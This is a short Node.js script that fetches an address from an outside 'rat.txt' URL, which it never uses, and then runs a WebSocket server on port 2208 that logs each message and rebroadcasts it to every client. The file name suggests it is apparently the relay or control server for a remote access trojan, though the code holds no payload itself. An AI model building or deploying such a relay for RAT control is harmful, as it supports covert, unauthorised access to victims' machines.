const axios = require('axios');
const WSserver = require('websocket').server;
const http = require('http');

async function main()
{
    let res = await axios.get('https://utilsy.glitch.me/rat.txt');
    let IP = res.data;

    const server = http.createServer();
    server.listen('2208',()=>
        {
            console.log('listening on port 2208')
        });

    const wsServer = new WSserver(
        {
            httpServer: server,
        });
    
    wsServer.on('request',(request)=>
        {
            const conn = request.accept(null,request.origin);
            console.log('Connection established');

            conn.on('close',()=>
                {
                    console.log('Connection closed');
                });
            conn.on('message',(data)=>
                {
                    console.log(data.utf8Data);
                    wsServer.broadcast(data.utf8Data);
                });
        });
}
main();